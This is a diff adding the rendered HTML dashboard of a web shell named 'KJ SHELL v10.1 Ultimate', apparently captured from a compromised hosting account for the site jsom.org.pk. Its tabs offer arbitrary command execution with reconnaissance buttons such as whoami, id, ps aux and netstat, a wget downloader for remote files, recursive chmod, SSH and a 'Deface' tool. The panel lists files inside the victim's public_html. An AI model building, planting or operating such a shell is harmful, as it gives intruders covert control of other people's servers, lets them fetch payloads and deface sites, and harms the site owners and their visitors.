@@ -1,0 +1,4594 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KJ SHELL PREMIUM - Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #0a0e1a;
+            color: #e0e4f0;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: rgba(255,255,255,0.02); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: rgba(66, 165, 245, 0.3); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(66, 165, 245, 0.5); }
+        
+        .container {
+            max-width: 1440px;
+            margin: 0 auto;
+            background: rgba(20, 28, 58, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, rgba(26, 35, 126, 0.4), rgba(13, 71, 161, 0.2));
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .header-logo { font-size: 28px; background: linear-gradient(135deg, #42a5f5, #7c4dff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .header-title { font-size: 20px; font-weight: 700; color: #ffffff; letter-spacing: 1px; }
+        .header-title span { background: linear-gradient(135deg, #42a5f5, #7c4dff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .header-badge { display: inline-block; padding: 2px 12px; background: rgba(66, 165, 245, 0.15); border: 1px solid rgba(66, 165, 245, 0.15); border-radius: 20px; font-size: 9px; color: rgba(255, 255, 255, 0.3); letter-spacing: 1px; margin-left: 8px; }
+        .header-right { display: flex; align-items: center; gap: 15px; font-size: 13px; color: rgba(255, 255, 255, 0.4); }
+        .header-right .user-info { display: flex; align-items: center; gap: 8px; }
+        .header-right .user-info .avatar { width: 30px; height: 30px; border-radius: 50%; background: linear-gradient(135deg, #42a5f5, #7c4dff); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 600; color: #fff; }
+        .header-right a { color: rgba(255, 255, 255, 0.3); text-decoration: none; transition: 0.3s; font-size: 13px; }
+        .header-right a:hover { color: rgba(255, 255, 255, 0.6); }
+        
+        .tabs {
+            display: flex;
+            background: rgba(0, 0, 0, 0.2);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            flex-wrap: wrap;
+            padding: 0 10px;
+            gap: 2px;
+        }
+        .tab {
+            padding: 12px 20px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: 0.3s;
+            font-size: 12px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.3);
+            letter-spacing: 0.5px;
+            border-radius: 8px 8px 0 0;
+        }
+        .tab:hover { color: rgba(255, 255, 255, 0.6); background: rgba(255, 255, 255, 0.02); }
+        .tab.active { color: #42a5f5; border-bottom-color: #42a5f5; background: rgba(66, 165, 245, 0.05); }
+        .tab i { margin-right: 6px; font-size: 12px; }
+        
+        .tab-content { display: none; padding: 25px 30px; }
+        .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .tab-content h3 { font-size: 18px; font-weight: 600; color: #ffffff; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .tab-content h3 span { font-size: 12px; font-weight: 400; color: rgba(255, 255, 255, 0.2); }
+        
+        .toolbar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 15px 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        .toolbar form { display: inline-flex; gap: 5px; align-items: center; flex-wrap: wrap; }
+        .toolbar input[type="text"], .toolbar input[type="file"], .toolbar select {
+            padding: 8px 14px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            color: #e0e4f0;
+            font-size: 13px;
+            font-family: 'Poppins', sans-serif;
+            transition: 0.3s;
+        }
+        .toolbar input[type="text"]:focus, .toolbar select:focus {
+            border-color: rgba(66, 165, 245, 0.3);
+            outline: none;
+            background: rgba(255, 255, 255, 0.06);
+        }
+        .toolbar input[type="text"]::placeholder { color: rgba(255, 255, 255, 0.15); }
+        
+        .btn {
+            padding: 8px 18px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            font-family: 'Poppins', sans-serif;
+            transition: 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .btn-primary { background: rgba(66, 165, 245, 0.2); color: #42a5f5; border: 1px solid rgba(66, 165, 245, 0.15); }
+        .btn-primary:hover { background: rgba(66, 165, 245, 0.3); border-color: rgba(66, 165, 245, 0.3); transform: translateY(-1px); }
+        .btn-success { background: rgba(76, 175, 80, 0.2); color: #66bb6a; border: 1px solid rgba(76, 175, 80, 0.15); }
+        .btn-success:hover { background: rgba(76, 175, 80, 0.3); border-color: rgba(76, 175, 80, 0.3); }
+        .btn-danger { background: rgba(244, 67, 54, 0.2); color: #ef5350; border: 1px solid rgba(244, 67, 54, 0.15); }
+        .btn-danger:hover { background: rgba(244, 67, 54, 0.3); border-color: rgba(244, 67, 54, 0.3); }
+        .btn-warning { background: rgba(255, 152, 0, 0.2); color: #ffa726; border: 1px solid rgba(255, 152, 0, 0.15); }
+        .btn-warning:hover { background: rgba(255, 152, 0, 0.3); border-color: rgba(255, 152, 0, 0.3); }
+        .btn-purple { background: rgba(124, 77, 255, 0.2); color: #9f7aea; border: 1px solid rgba(124, 77, 255, 0.15); }
+        .btn-purple:hover { background: rgba(124, 77, 255, 0.3); border-color: rgba(124, 77, 255, 0.3); }
+        .btn-cyan { background: rgba(0, 229, 255, 0.15); color: #4dd0e1; border: 1px solid rgba(0, 229, 255, 0.15); }
+        .btn-cyan:hover { background: rgba(0, 229, 255, 0.25); border-color: rgba(0, 229, 255, 0.25); }
+        
+        .breadcrumb {
+            padding: 12px 0;
+            font-size: 14px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            margin-bottom: 15px;
+        }
+        .breadcrumb a { color: #42a5f5; text-decoration: none; }
+        .breadcrumb a:hover { text-decoration: underline; }
+        .breadcrumb .separator { margin: 0 8px; color: rgba(255, 255, 255, 0.15); }
+        
+        .message {
+            padding: 12px 20px;
+            margin: 10px 0;
+            border-radius: 10px;
+            white-space: pre-wrap;
+            font-size: 13px;
+        }
+        .message.success { background: rgba(76, 175, 80, 0.1); color: #66bb6a; border: 1px solid rgba(76, 175, 80, 0.15); }
+        .message.error { background: rgba(244, 67, 54, 0.1); color: #ef5350; border: 1px solid rgba(244, 67, 54, 0.15); }
+        .message.warning { background: rgba(255, 152, 0, 0.1); color: #ffa726; border: 1px solid rgba(255, 152, 0, 0.15); }
+        
+        .file-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        .file-item {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            transition: 0.3s;
+            position: relative;
+        }
+        .file-item:hover {
+            background: rgba(255, 255, 255, 0.04);
+            transform: translateY(-2px);
+            border-color: rgba(255, 255, 255, 0.08);
+        }
+        .file-item.is-root {
+            border-color: rgba(244, 67, 54, 0.3);
+            background: rgba(244, 67, 54, 0.05);
+        }
+        .file-item.is-root .name a { color: #ef5350; }
+        .file-item .root-badge {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: rgba(244, 67, 54, 0.15);
+            color: #ef5350;
+            font-size: 8px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        .file-item .icon { font-size: 40px; margin-bottom: 8px; }
+        .file-item .name { font-size: 13px; word-break: break-all; }
+        .file-item .name a { color: #e0e4f0; text-decoration: none; }
+        .file-item .name a:hover { color: #42a5f5; }
+        .file-item .size { font-size: 11px; color: rgba(255, 255, 255, 0.25); }
+        .file-item .actions { margin-top: 8px; display: flex; gap: 4px; justify-content: center; flex-wrap: wrap; }
+        .file-item .actions button {
+            padding: 2px 8px;
+            font-size: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .file-item .actions .edit { background: rgba(66, 165, 245, 0.15); color: #42a5f5; }
+        .file-item .actions .edit:hover { background: rgba(66, 165, 245, 0.25); }
+        .file-item .actions .rename { background: rgba(255, 152, 0, 0.15); color: #ffa726; }
+        .file-item .actions .rename:hover { background: rgba(255, 152, 0, 0.25); }
+        .file-item .actions .delete { background: rgba(244, 67, 54, 0.15); color: #ef5350; }
+        .file-item .actions .delete:hover { background: rgba(244, 67, 54, 0.25); }
+        .file-item .actions .chmod { background: rgba(76, 175, 80, 0.15); color: #66bb6a; }
+        .file-item .actions .chmod:hover { background: rgba(76, 175, 80, 0.25); }
+        
+        .cmd-output {
+            background: rgba(0, 0, 0, 0.3);
+            color: #68d391;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            max-height: 450px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        
+        .form-group { margin: 10px 0; }
+        .form-group label { display: inline-block; width: 140px; font-weight: 500; font-size: 13px; color: rgba(255, 255, 255, 0.6); }
+        .form-group input, .form-group textarea, .form-group select {
+            padding: 8px 14px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            color: #e0e4f0;
+            font-size: 13px;
+            font-family: 'Poppins', sans-serif;
+            min-width: 300px;
+            transition: 0.3s;
+        }
+        .form-group input:focus, .form-group textarea:focus, .form-group select:focus {
+            border-color: rgba(66, 165, 245, 0.3);
+            outline: none;
+            background: rgba(255, 255, 255, 0.06);
+        }
+        .form-group textarea { min-height: 60px; font-family: 'Courier New', monospace; }
+        
+        .chmod-section {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+        .chmod-section h4 { color: #ffffff; margin-bottom: 15px; font-weight: 500; }
+        
+        .quick-commands {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            margin: 10px 0;
+        }
+        .quick-commands button {
+            padding: 4px 14px;
+            background: rgba(255, 255, 255, 0.03);
+            color: rgba(255, 255, 255, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 11px;
+            font-family: 'Poppins', sans-serif;
+            transition: 0.3s;
+        }
+        .quick-commands button:hover {
+            background: rgba(255, 255, 255, 0.06);
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .stats {
+            padding: 15px 30px;
+            background: rgba(0, 0, 0, 0.15);
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.2);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: rgba(20, 28, 58, 0.95);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-content h3 { color: #ffffff; margin-bottom: 15px; }
+        .modal-content textarea {
+            width: 100%;
+            min-height: 200px;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            color: #e0e4f0;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+        .modal-content .close-btn {
+            float: right;
+            font-size: 24px;
+            cursor: pointer;
+            color: rgba(255, 255, 255, 0.2);
+            transition: 0.3s;
+        }
+        .modal-content .close-btn:hover { color: rgba(255, 255, 255, 0.5); }
+        
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .info-grid .item { padding: 10px 15px; background: rgba(255, 255, 255, 0.02); border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.03); }
+        .info-grid .item strong { color: rgba(255, 255, 255, 0.6); }
+        .info-grid .item .value { color: #e0e4f0; }
+        
+        @media (max-width: 768px) {
+            .file-grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); }
+            .header { flex-direction: column; text-align: center; gap: 10px; }
+            .toolbar { flex-direction: column; align-items: stretch; }
+            .form-group label { width: 100%; }
+            .info-grid { grid-template-columns: 1fr; }
+            .tabs .tab { padding: 8px 12px; font-size: 10px; }
+            .tab-content { padding: 15px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <div class="header-left">
+            <div class="header-logo">🚀</div>
+            <div class="header-title">
+                KJ SHELL                <span class="header-badge">v10.1 Ultimate</span>
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="user-info">
+                <div class="avatar">a</div>
+                <span>admin</span>
+            </div>
+            <span>|</span>
+            <i class="fas fa-clock"></i> 07:00:54            <a href="?logout" onclick="return confirm('Logout?')"><i class="fas fa-sign-out-alt"></i> Logout</a>
+        </div>
+    </div>
+    
+    <!-- Tabs -->
+    <div class="tabs">
+        <div class="tab active" onclick="showTab('files')"><i class="fas fa-folder"></i> Files</div>
+        <div class="tab" onclick="showTab('cmd')"><i class="fas fa-terminal"></i> Command</div>
+        <div class="tab" onclick="showTab('download')"><i class="fas fa-download"></i> Download</div>
+        <div class="tab" onclick="showTab('chmod')"><i class="fas fa-lock"></i> CHMOD</div>
+        <div class="tab" onclick="showTab('log')"><i class="fas fa-history"></i> Log</div>
+        <div class="tab" onclick="showTab('ssh')"><i class="fas fa-shield-alt"></i> SSH</div>
+        <div class="tab" onclick="showTab('extract')"><i class="fas fa-file-archive"></i> Extract</div>
+        <div class="tab" onclick="showTab('zip')"><i class="fas fa-compress"></i> Zip</div>
+        <div class="tab" onclick="showTab('deface')"><i class="fas fa-skull"></i> Deface</div>
+        <div class="tab" onclick="showTab('info')"><i class="fas fa-info-circle"></i> Info</div>
+    </div>
+    
+    <!-- Tab: Files -->
+    <div id="tab-files" class="tab-content active">
+        <div class="toolbar">
+            <form method="post" enctype="multipart/form-data">
+                <input type="file" name="upload_file" required>
+                <button type="submit" class="btn btn-success"><i class="fas fa-upload"></i> Upload</button>
+            </form>
+            <form method="post">
+                <input type="text" name="folder_name" placeholder="Folder name" required>
+                <button type="submit" name="create_folder" value="1" class="btn btn-primary"><i class="fas fa-folder-plus"></i> New</button>
+            </form>
+            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.2);">
+                <i class="fas fa-database"></i> 3 items
+            </span>
+        </div>
+        
+        <div class="breadcrumb">
+            <a href="?path=%2Fhome%2Fu732831926%2Fdomains%2Fjsom.org.pk%2Fpublic_html%2Fhost"><i class="fas fa-home"></i></a>
+                            <span class="separator">/</span>
+                <a href="?path=%2Fhome">
+                    home                </a>
+                            <span class="separator">/</span>
+                <a href="?path=%2Fhome%2Fu732831926">
+                    u732831926                </a>
+                            <span class="separator">/</span>
+                <a href="?path=%2Fhome%2Fu732831926%2Fdomains">
+                    domains                </a>
+                            <span class="separator">/</span>
+                <a href="?path=%2Fhome%2Fu732831926%2Fdomains%2Fjsom.org.pk">
+                    jsom.org.pk                </a>
+                            <span class="separator">/</span>
+                <a href="?path=%2Fhome%2Fu732831926%2Fdomains%2Fjsom.org.pk%2Fpublic_html">
+                    public_html                </a>
+                            <span class="separator">/</span>
+                <a href="?path=%2Fhome%2Fu732831926%2Fdomains%2Fjsom.org.pk%2Fpublic_html%2Fhost">
+                    host                </a>
+                                        <span style="margin-left:15px;">
+                    <a href="?path=%2Fhome%2Fu732831926%2Fdomains%2Fjsom.org.pk%2Fpublic_html" style="color:rgba(255,255,255,0.2);">
+                        <i class="fas fa-arrow-up"></i> ..
+                    </a>
+                </span>
+                    </div>
+        
+                
+        <div class="file-grid">
+                                                <div class="file-item ">
+                                                <div class="icon">
+                                                            <i class="fas fa-code" style="color:#63b3ed;"></i>
+                                                    </div>
+                        <div class="name">
+                                                            <a href="1212.php" target="_blank">
+                                    1212.php                                </a>
+                                                    </div>
+                        <div class="size">
+                                                            128.07 KB                                                        <span style="font-size:10px;color:rgba(255,255,255,0.15);">0644</span>
+                        </div>
+                        <div class="actions">
+                                                            <button class="edit" onclick="editFile('1212.php')">
+                                    <i class="fas fa-edit"></i>
+                                </button>
+                                                        <button class="rename" onclick="renameItem('1212.php')">
+                                <i class="fas fa-pen"></i>
+                            </button>
+                            <button class="delete" onclick="deleteItem('1212.php')">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                            <button class="chmod" onclick="chmodItem('1212.php', '644')">
+                                <i class="fas fa-lock"></i>
+                            </button>
+                        </div>
+                    </div>
+                                    <div class="file-item ">
+                                                <div class="icon">
+                                                            <i class="fas fa-file" style="color:#a0aec0;"></i>
+                                                    </div>
+                        <div class="name">
+                                                            <a href="access.log" target="_blank">
+                                    access.log                                </a>
+                                                    </div>
+                        <div class="size">
+                                                            2.98 KB                                                        <span style="font-size:10px;color:rgba(255,255,255,0.15);">0644</span>
+                        </div>
+                        <div class="actions">
+                                                        <button class="rename" onclick="renameItem('access.log')">
+                                <i class="fas fa-pen"></i>
+                            </button>
+                            <button class="delete" onclick="deleteItem('access.log')">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                            <button class="chmod" onclick="chmodItem('access.log', '644')">
+                                <i class="fas fa-lock"></i>
+                            </button>
+                        </div>
+                    </div>
+                                    <div class="file-item ">
+                                                <div class="icon">
+                                                            <i class="fas fa-code" style="color:#63b3ed;"></i>
+                                                    </div>
+                        <div class="name">
+                                                            <a href="functions.php" target="_blank">
+                                    functions.php                                </a>
+                                                    </div>
+                        <div class="size">
+                                                            136.46 KB                                                        <span style="font-size:10px;color:rgba(255,255,255,0.15);">0644</span>
+                        </div>
+                        <div class="actions">
+                                                            <button class="edit" onclick="editFile('functions.php')">
+                                    <i class="fas fa-edit"></i>
+                                </button>
+                                                        <button class="rename" onclick="renameItem('functions.php')">
+                                <i class="fas fa-pen"></i>
+                            </button>
+                            <button class="delete" onclick="deleteItem('functions.php')">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                            <button class="chmod" onclick="chmodItem('functions.php', '644')">
+                                <i class="fas fa-lock"></i>
+                            </button>
+                        </div>
+                    </div>
+                                    </div>
+    </div>
+    
+    <!-- Tab: Command -->
+    <div id="tab-cmd" class="tab-content">
+        <h3><i class="fas fa-terminal"></i> Command Execution <span>Live Output • Auto Clear</span></h3>
+        <form method="post" onsubmit="return runCommandAndClear(this);">
+            <div class="form-group">
+                <label>Command:</label>
+                <input type="text" name="alfa_cmd" id="cmd_input" placeholder="ls -la | whoami | id" style="min-width:400px;" required autocomplete="off">
+                <button type="submit" class="btn btn-primary"><i class="fas fa-play"></i> Run</button>
+            </div>
+        </form>
+        
+        <div class="quick-commands">
+            <button onclick="setCmdAndRun('ls -la')">ls -la</button>
+            <button onclick="setCmdAndRun('pwd')">pwd</button>
+            <button onclick="setCmdAndRun('whoami')">whoami</button>
+            <button onclick="setCmdAndRun('id')">id</button>
+            <button onclick="setCmdAndRun('uname -a')">uname -a</button>
+            <button onclick="setCmdAndRun('ps aux')">ps aux</button>
+            <button onclick="setCmdAndRun('netstat -tulpn')">netstat</button>
+            <button onclick="setCmdAndRun('df -h')">df -h</button>
+            <button onclick="setCmdAndRun('free -m')">free -m</button>
+        </div>
+        
+                
+        <div id="cmd_result" style="display:none;" class="cmd-output"></div>
+    </div>
+    
+    <!-- Tab: Download -->
+    <div id="tab-download" class="tab-content">
+        <h3><i class="fas fa-download"></i> Download Manager <span>wget + unzip • Auto Clear</span></h3>
+        
+        <div id="download_result" style="display:none;" class="cmd-output"></div>
+        
+        <!-- WGET -->
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:20px;margin:15px 0;">
+            <h4 style="color:#66bb6a;font-weight:400;"><i class="fas fa-cloud-download-alt"></i> Download File (wget)</h4>
+            <form method="post" onsubmit="return runWgetAndClear(this);">
+                <div class="form-group">
+                    <label>URL:</label>
+                    <input type="text" name="wget_url" id="wget_url" placeholder="https://example.com/file.zip" style="min-width:400px;" required autocomplete="off">
+                </div>
+                <div class="form-group">
+                    <label>Save as:</label>
+                    <input type="text" name="wget_filename" id="wget_filename" placeholder="filename.zip (kosongkan = auto)" style="min-width:300px;" autocomplete="off">
+                </div>
+                <button type="submit" name="wget_download" value="1" class="btn btn-success">
+                    <i class="fas fa-download"></i> Download
+                </button>
+            </form>
+        </div>
+        
+        <!-- UNZIP -->
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:20px;margin:15px 0;">
+            <h4 style="color:#ffa726;font-weight:400;"><i class="fas fa-file-archive"></i> Extract Archive (unzip)</h4>
+            <form method="post" onsubmit="return runUnzipAndClear(this);">
+                <div class="form-group">
+                    <label>File:</label>
+                    <input type="text" name="unzip_path" id="unzip_path" placeholder="file.zip" style="min-width:350px;" required autocomplete="off">
+                </div>
+                <div class="form-group">
+                    <label>Extract to:</label>
+                    <input type="text" name="unzip_target" id="unzip_target" placeholder="/path/to/target (kosongkan = auto)" style="min-width:350px;" autocomplete="off">
+                </div>
+                <button type="submit" name="unzip_file" value="1" class="btn btn-warning">
+                    <i class="fas fa-file-archive"></i> Extract
+                </button>
+            </form>
+        </div>
+        
+        <div style="padding:15px;background:rgba(255,255,255,0.02);border-radius:10px;border:1px solid rgba(255,255,255,0.03);">
+            <h4 style="color:rgba(255,255,255,0.3);font-size:12px;font-weight:400;"><i class="fas fa-info-circle"></i> Supported Formats</h4>
+            <div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:8px;font-size:12px;color:rgba(255,255,255,0.3);">
+                <span>📦 ZIP</span>
+                <span>📦 TAR</span>
+                <span>📦 GZ</span>
+                <span>📦 TAR.GZ</span>
+                <span>📦 RAR</span>
+                <span>📦 TGZ</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Tab: CHMOD -->
+    <div id="tab-chmod" class="tab-content">
+        <h3><i class="fas fa-lock"></i> CHMOD Manager <span>File & Folder Permission</span></h3>
+        
+        <div class="chmod-section">
+            <h4>🔒 1. Single CHMOD</h4>
+            <form method="post">
+                <div class="form-group">
+                    <label>File/Folder:</label>
+                    <input type="text" name="chmod_path" id="chmod_path" placeholder="filename.php" style="min-width:250px;" required>
+                </div>
+                <div class="form-group">
+                    <label>Permission:</label>
+                    <select name="chmod_perm">
+                        <option value="644">644 (rw-r--r--)</option>
+                        <option value="755">755 (rwxr-xr-x)</option>
+                        <option value="777">777 (rwxrwxrwx) ⚠️</option>
+                        <option value="600">600 (rw-------)</option>
+                        <option value="664">664 (rw-rw-r--)</option>
+                        <option value="775">775 (rwxrwxr-x)</option>
+                    </select>
+                </div>
+                <button type="submit" name="chmod_single" value="1" class="btn btn-cyan">
+                    <i class="fas fa-lock"></i> Change Permission
+                </button>
+            </form>
+        </div>
+        
+        <div class="chmod-section">
+            <h4>📁 2. Mass CHMOD (Recursive)</h4>
+            <form method="post">
+                <div class="form-group">
+                    <label>Target Directory:</label>
+                    <input type="text" name="chmod_dir" value="/home/u732831926/domains/jsom.org.pk/public_html/host" style="min-width:250px;">
+                </div>
+                <div class="form-group">
+                    <label>File Permission:</label>
+                    <select name="chmod_file_perm">
+                        <option value="644">644 (rw-r--r--)</option>
+                        <option value="600">600 (rw-------)</option>
+                        <option value="664">664 (rw-rw-r--)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Folder Permission:</label>
+                    <select name="chmod_dir_perm">
+                        <option value="755">755 (rwxr-xr-x)</option>
+                        <option value="775">775 (rwxrwxr-x)</option>
+                        <option value="700">700 (rwx------)</option>
+                    </select>
+                </div>
+                <button type="submit" name="chmod_mass" value="1" class="btn btn-warning" onclick="return confirm('⚠️ Yakin ingin mass CHMOD?')">
+                    <i class="fas fa-lock"></i> Mass CHMOD
+                </button>
+            </form>
+        </div>
+        
+        <div class="chmod-section">
+            <h4>📄 3. CHMOD by Pattern</h4>
+            <form method="post">
+                <div class="form-group">
+                    <label>Target Directory:</label>
+                    <input type="text" name="chmod_pattern_dir" value="/home/u732831926/domains/jsom.org.pk/public_html/host" style="min-width:250px;">
+                </div>
+                <div class="form-group">
+                    <label>Pattern:</label>
+                    <input type="text" name="chmod_pattern" placeholder="*.php or php,html,js" style="min-width:200px;" required>
+                </div>
+                <div class="form-group">
+                    <label>Permission:</label>
+                    <select name="chmod_pattern_perm">
+                        <option value="644">644 (rw-r--r--)</option>
+                        <option value="755">755 (rwxr-xr-x)</option>
+                        <option value="600">600 (rw-------)</option>
+                    </select>
+                </div>
+                <button type="submit" name="chmod_pattern" value="1" class="btn btn-purple">
+                    <i class="fas fa-lock"></i> CHMOD by Pattern
+                </button>
+            </form>
+        </div>
+        
+                
+        <div style="margin-top:15px;padding:15px;background:rgba(255,255,255,0.02);border-radius:10px;border:1px solid rgba(255,255,255,0.03);">
+            <h4 style="color:rgba(255,255,255,0.4);font-size:12px;font-weight:400;"><i class="fas fa-info-circle"></i> Permission Guide</h4>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:5px;font-size:12px;color:rgba(255,255,255,0.3);margin-top:8px;">
+                <div>644: rw-r--r-- (File default)</div>
+                <div>755: rwxr-xr-x (Folder default)</div>
+                <div>777: rwxrwxrwx ⚠️ TIDAK AMAN</div>
+                <div>600: rw------- (Private)</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Tab: Log -->
+    <div id="tab-log" class="tab-content">
+        <h3><i class="fas fa-history"></i> Activity Log <span>Multi-Domain</span></h3>
+        
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:15px;margin:10px 0;">
+            <h4 style="color:rgba(255,255,255,0.5);font-weight:400;font-size:14px;">🌐 Domains</h4>
+            <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:8px;margin-top:10px;">
+                                <div style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);">
+                    <div style="color:#e0e4f0;font-size:13px;">u732831926 (Home)</div>
+                    <div style="font-size:11px;color:rgba(255,255,255,0.2);">📂 /home/u732831926/public_html</div>
+                    <div style="margin-top:5px;">
+                        <button onclick="viewLog('/home/u732831926/public_html')" class="btn btn-cyan" style="padding:2px 10px;font-size:10px;">
+                            <i class="fas fa-eye"></i> View
+                        </button>
+                        <button onclick="monitorDomain('/home/u732831926/public_html')" class="btn btn-warning" style="padding:2px 10px;font-size:10px;">
+                            <i class="fas fa-search"></i> Monitor
+                        </button>
+                    </div>
+                </div>
+                                <div style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);">
+                    <div style="color:#e0e4f0;font-size:13px;">Current (host)</div>
+                    <div style="font-size:11px;color:rgba(255,255,255,0.2);">📂 /home/u732831926/domains/jsom.org.pk/public_html/host</div>
+                    <div style="margin-top:5px;">
+                        <button onclick="viewLog('/home/u732831926/domains/jsom.org.pk/public_html/host')" class="btn btn-cyan" style="padding:2px 10px;font-size:10px;">
+                            <i class="fas fa-eye"></i> View
+                        </button>
+                        <button onclick="monitorDomain('/home/u732831926/domains/jsom.org.pk/public_html/host')" class="btn btn-warning" style="padding:2px 10px;font-size:10px;">
+                            <i class="fas fa-search"></i> Monitor
+                        </button>
+                    </div>
+                </div>
+                                <div style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);">
+                    <div style="color:#e0e4f0;font-size:13px;">jsom.org.pk (DocumentRoot)</div>
+                    <div style="font-size:11px;color:rgba(255,255,255,0.2);">📂 /home/u732831926/domains/jsom.org.pk/public_html</div>
+                    <div style="margin-top:5px;">
+                        <button onclick="viewLog('/home/u732831926/domains/jsom.org.pk/public_html')" class="btn btn-cyan" style="padding:2px 10px;font-size:10px;">
+                            <i class="fas fa-eye"></i> View
+                        </button>
+                        <button onclick="monitorDomain('/home/u732831926/domains/jsom.org.pk/public_html')" class="btn btn-warning" style="padding:2px 10px;font-size:10px;">
+                            <i class="fas fa-search"></i> Monitor
+                        </button>
+                    </div>
+                </div>
+                            </div>
+        </div>
+        
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:15px;margin:10px 0;">
